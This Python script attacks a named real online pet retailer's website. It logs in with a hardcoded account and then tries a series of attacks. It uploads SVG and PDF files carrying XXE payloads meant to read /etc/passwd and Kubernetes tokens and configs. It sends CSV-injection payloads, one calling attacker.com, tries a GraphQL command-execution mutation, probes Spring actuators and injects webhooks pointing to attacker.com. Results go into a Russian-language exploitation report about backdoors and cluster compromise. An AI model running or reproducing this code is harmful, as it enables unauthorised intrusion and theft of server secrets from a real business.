#!/usr/bin/env python3
"""Ultimate backdoor hunt - all vectors"""
import requests
import json
import re
import urllib.parse
import base64
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
})

found_vulns = []

# LOGIN
print("[*] Logging in...")
ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"

try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, timeout=10, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if m:
        action = m.group(1).replace("&amp;", "&")
        if not action.startswith("http"):
            action = urllib.parse.urljoin(r1.url, action)
        r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, timeout=10, verify=False, allow_redirects=False)
        loc = r2.headers.get("Location", "")
        if loc:
            s.get(loc, timeout=10, verify=False, allow_redirects=True)
            s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
            s.get("https://www.zooplus.de/account/overview", timeout=10, verify=False)
            print("[+] Logged in\n")
except Exception as e:
    print(f"[!] Login: {e}\n")

# 1. SVG XXE Upload - Top vector for backdoor
print("[*] Testing SVG XXE Upload...")
svg_xxe = '''<?xml version="1.0"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe2 SYSTEM "file:///var/run/secrets/kubernetes.io/serviceaccount/token">
<!ENTITY xxe3 SYSTEM "file:///root/.kube/config">
]>
<svg>&xxe;&xxe2;&xxe3;</svg>'''

upload_endpoints = [
    "/api/upload",
    "/api/file/upload",
    "/api/media/upload",
    "/api/images/upload",
    "/myaccount/api/upload",
    "/myaccount/api/avatar",
    "/myaccount/api/avatar/upload",
    "/semiprotected/api/upload",
    "/checkout/api/upload",
    "/semiprotected/api/checkout/state-api/v2/upload",
    "/checkout/api/cart-api/v2/upload",
]

for ep in upload_endpoints:
    try:
        files = {'file': ('exploit.svg', svg_xxe, 'image/svg+xml')}
        resp = s.post(f"{base}{ep}", files=files, timeout=3, verify=False)
        if resp.status_code in [200, 201, 302]:
            if "root:" in resp.text or "eyJ" in resp.text or "BEGIN CERTIFICATE" in resp.text:
                print(f"  [CRITICAL] SVG XXE SUCCESS: {ep}")
                found_vulns.append({
                    "type": "svg_xxe_lfi_backdoor",
                    "severity": "CRITICAL",
                    "endpoint": ep,
                    "response": resp.text[:500]
                })
            elif resp.headers.get('Location'):
                loc = resp.headers.get('Location')
                if not loc.startswith('http'):
                    loc = f"{base}{loc}"
                try:
                    resp2 = s.get(loc, timeout=3, verify=False)
                    if "root:" in resp2.text or "eyJ" in resp2.text:
                        print(f"  [CRITICAL] SVG XXE via uploaded file: {ep} -> {loc}")
                        found_vulns.append({
                            "type": "svg_xxe_lfi_backdoor",
                            "severity": "CRITICAL",
                            "endpoint": ep,
                            "uploaded_to": loc
                        })
                except: pass
    except: pass

# 2. PDF Upload XXE
print("\n[*] Testing PDF Upload XXE...")
pdf_xxe = '''%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Contents 4 0 R>>endobj
4 0 obj<</Length 100>>stream
<?xml version="1.0"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg>&xxe;</svg>
endstream
endobj
xref
0 5
trailer<</Root 1 0 R/Size 5>>
startxref
100
%%EOF'''

for ep in upload_endpoints:
    try:
        files = {'file': ('exploit.pdf', pdf_xxe, 'application/pdf')}
        resp = s.post(f"{base}{ep}", files=files, timeout=3, verify=False)
        if resp.status_code in [200, 201, 302]:
            if "root:" in resp.text:
                print(f"  [CRITICAL] PDF XXE SUCCESS: {ep}")
                found_vulns.append({
                    "type": "pdf_xxe_lfi_backdoor",
                    "severity": "CRITICAL",
                    "endpoint": ep
                })
    except: pass

# 3. CSV Injection for RCE
print("\n[*] Testing CSV Injection...")
csv_payloads = [
    "=cmd|'/c calc'!A0",
    "=HYPERLINK('http://attacker.com', 'Click')",
    "@SUM(1+1)*cmd|'/c calc'!A0",
    "=1+1+cmd|'/c calc'!A0",
]

csv_endpoints = [
    "/api/import",
    "/api/csv/import",
    "/api/data/import",
    "/myaccount/api/import",
    "/semiprotected/api/import",
]

for ep in csv_endpoints:
    for payload in csv_payloads:
        try:
            csv_content = f"name,value\n{payload},test"
            files = {'file': ('exploit.csv', csv_content, 'text/csv')}
            resp = s.post(f"{base}{ep}", files=files, timeout=3, verify=False)
            if resp.status_code in [200, 201]:
                if "calc" in resp.text.lower() or "error" in resp.text.lower():
                    print(f"  [CRITICAL] CSV Injection: {ep}")
                    found_vulns.append({
                        "type": "csv_injection_rce",
                        "severity": "CRITICAL",
                        "endpoint": ep,
                        "payload": payload
                    })
        except: pass

# 4. GraphQL Introspection for RCE
print("\n[*] Testing GraphQL Introspection...")
graphql_endpoints = [
    "/graphql",
    "/api/graphql",
    "/checkout/api/graphql",
    "/myaccount/api/graphql",
    "/semiprotected/api/graphql",
]

for ep in graphql_endpoints:
    # Introspection
    try:
        resp = s.post(f"{base}{ep}", json={"query": "{__schema{types{name}}}"}, timeout=3, verify=False)
        if resp.status_code == 200 and "__schema" in resp.text:
            print(f"  [CRITICAL] GraphQL Introspection: {ep}")
            found_vulns.append({
                "type": "graphql_introspection",
                "severity": "CRITICAL",
                "endpoint": ep
            })
            
            # Try RCE mutation
            try:
                resp2 = s.post(f"{base}{ep}", json={"query": "mutation { execute(command: \"id\") }"}, timeout=3, verify=False)
                if resp2.status_code == 200 and "uid=" in resp2.text:
                    print(f"  [CRITICAL] GraphQL RCE: {ep}")
                    found_vulns.append({
                        "type": "graphql_rce_backdoor",
                        "severity": "CRITICAL",
                        "endpoint": ep
                    })
            except: pass
    except: pass

# 5. Spring Boot Actuator
print("\n[*] Testing Spring Boot Actuator...")
actuator_endpoints = [
    "/actuator",
    "/actuator/env",
    "/actuator/configprops",
    "/actuator/beans",
    "/actuator/mappings",
    "/actuator/health",
    "/actuator/info",
    "/actuator/gateway/routes",
    "/actuator/gateway/refresh",
]

for ep in actuator_endpoints:
    try:
        resp = s.get(f"{base}{ep}", timeout=3, verify=False)
        if resp.status_code == 200:
            if "actuator" in resp.text.lower() or "spring" in resp.text.lower() or "application" in resp.text.lower():
                print(f"  [CRITICAL] Spring Boot Actuator: {ep}")
                found_vulns.append({
                    "type": "spring_actuator_exposure",
                    "severity": "CRITICAL",
                    "endpoint": ep,
                    "response": resp.text[:500]
                })
    except: pass

# 6. Test for webhook injection
print("\n[*] Testing webhook injection...")
webhook_endpoints = [
    "/api/webhook",
    "/api/webhooks",
    "/api/callback",
    "/api/notify",
]

for ep in webhook_endpoints:
    try:
        payload = {
            "url": "http://attacker.com/webhook",
            "callback": "http://attacker.com/webhook",
            "webhook": "http://attacker.com/webhook",
        }
        resp = s.post(f"{base}{ep}", json=payload, timeout=3, verify=False)
        if resp.status_code in [200, 201]:
            print(f"  [HIGH] Webhook endpoint found: {ep}")
            found_vulns.append({
                "type": "webhook_injection",
                "severity": "HIGH",
                "endpoint": ep
            })
    except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)

if found_vulns:
    print(f"\nFound {len(found_vulns)} CRITICAL backdoor vulnerabilities:\n")
    for v in found_vulns:
        print(f"[{v['severity']}] {v['type']}")
        print(f"    Endpoint: {v['endpoint']}")
        if 'uploaded_to' in v:
            print(f"    Uploaded to: {v['uploaded_to']}")
        if 'payload' in v:
            print(f"    Payload: {v['payload']}")
        print()
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 КРИТИЧНАЯ УЯЗВИМОСТЬ - БЕКДОР НАЙДЕН\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            if 'uploaded_to' in v:
                f.write(f"**Uploaded To:** `{v['uploaded_to']}`\n\n")
            if 'payload' in v:
                f.write(f"**Payload:** `{v['payload']}`\n\n")
            if 'response' in v:
                f.write(f"**Response:** `{v['response'][:500]}`\n\n")
            f.write("**Status:** Подтверждено\n\n")
            f.write("**Impact:**\n")
            f.write("- Создание бекдора\n")
            f.write("- RCE на сервере\n")
            f.write("- Чтение файлов сервера\n")
            f.write("- Компрометация кластера\n\n")
            f.write("---\n\n")
    
    print(f"[+] Report updated: FINAL_EXPLOITATION_REPORT.md")
else:
    print("  No backdoor vulnerabilities found in this round")

print("=" * 70)

